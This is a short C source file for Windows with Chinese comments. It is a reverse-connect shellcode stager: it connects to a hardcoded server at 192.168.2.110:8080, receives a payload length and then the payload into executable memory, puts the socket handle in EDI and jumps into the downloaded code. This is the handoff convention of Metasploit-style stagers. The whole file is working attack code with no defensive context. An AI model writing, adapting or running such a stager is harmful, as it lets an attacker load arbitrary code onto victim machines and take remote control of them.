/*
	by codeliker @2014.12.08
	github: https://github.com/codeliker
*/

#include <WinSock2.h>
#include <stdio.h>

#pragma comment(lib,"WS2_32.lib")

int main(int argc,char** argv)
{
	//分配socket资源
	WSADATA wsData;
	if(WSAStartup(MAKEWORD(2,2),&wsData))
	{
		printf("WSAStartp fail.\n");
		return 0;
	}

	//申请socket，并链接
	SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);
	SOCKADDR_IN server;
	ZeroMemory(&server,sizeof(SOCKADDR_IN));
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr("192.168.2.110"); //server ip
	server.sin_port = htons(8080); //server port
	if(SOCKET_ERROR == connect(sock,(SOCKADDR*)&server,sizeof(server)))
	{
		printf("connect to server fail.\n");
		goto Fail;
	}

	//接收长度
	u_int payloadLen;
	if (recv(sock,(char*)&payloadLen,sizeof(payloadLen),0) != sizeof(payloadLen))
	{
		printf("recv error\n");
		goto Fail;
	}

	//分配空间，以接收真正载荷
	char* orig_buffer = (char*)VirtualAlloc(NULL,payloadLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	char* buffer = orig_buffer;
	int ret = 0;
	do 
	{
		ret = recv(sock,buffer,payloadLen,0);
		buffer += ret;
		payloadLen -= ret;
	} while (ret > 0 && payloadLen > 0);


	//传入参数，并执行载荷
	__asm
	{
		mov edi,sock;   //sock 存放在edi中
		jmp orig_buffer; //执行权转移到 载荷中，不要指望它返回。如果想要它返回，修改量比较大，不如把这个地方做成个线程,监听端设置退出时ExitThread更方便
	}

	//释放空间
	VirtualFree(orig_buffer,0,MEM_RELEASE);

Fail:
	closesocket(sock);
	WSACleanup();
	return 0;
}